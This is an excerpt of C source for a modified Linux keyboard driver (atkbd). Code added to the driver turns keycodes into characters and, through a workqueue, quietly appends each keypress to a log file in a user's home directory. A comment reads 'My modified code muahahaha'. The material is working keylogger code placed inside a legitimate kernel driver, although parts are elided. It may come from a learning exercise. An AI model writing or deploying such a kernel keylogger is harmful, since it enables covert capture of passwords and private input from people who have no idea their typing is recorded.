...
char convert_keycode_to_char(unsigned short keycode) {
    if (keycode >= 128)
        return 0;
...
void log_keypress_file(char ch){
	...
	switch(ch){
		case ' ':
			len = snprintf(buf, sizeof(buf), "[SPACE]\n");
			break;
		case '\n':
			len = snprintf(buf, sizeof(buf), "[ENTER]\n");
			break;
		case '\t':
			len = snprintf(buf, sizeof(buf), "[TAB]\n");
			break;
		case '\b':
			len = snprintf(buf, sizeof(buf), "[BACKSPACE]\n");
			break;
		default:
			if(ch>=32 && ch<=126)
	...
	f = filp_open("/home/mentee/logs/keystrokes.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
...
static char buffered_key = 0;

static void keylog_worker(struct work_struct *work)
{
    if (buffered_key != 0) {
        log_keypress_file(buffered_key);
        buffered_key = 0;
    }
}

static DECLARE_WORK(keylog_work, keylog_worker);
static struct workqueue_struct *keylog_wq;
				   ...
				   unsigned int flags)
{
	...
	printk(KERN_INFO "keylogger: Key press: 0x%02x\n", data);
	...
	// My modified code muahahaha
	char ch = convert_keycode_to_char(keycode);
	if (ch!=0){
		if (!work_pending(&keylog_work)) {
    			buffered_key = ch;
    			queue_work(keylog_wq, &keylog_work);
		}
	}
...
static int __init atkbd_init(void)
{
	...
	keylog_wq = alloc_workqueue("keylog_wq", WQ_UNBOUND, 0);
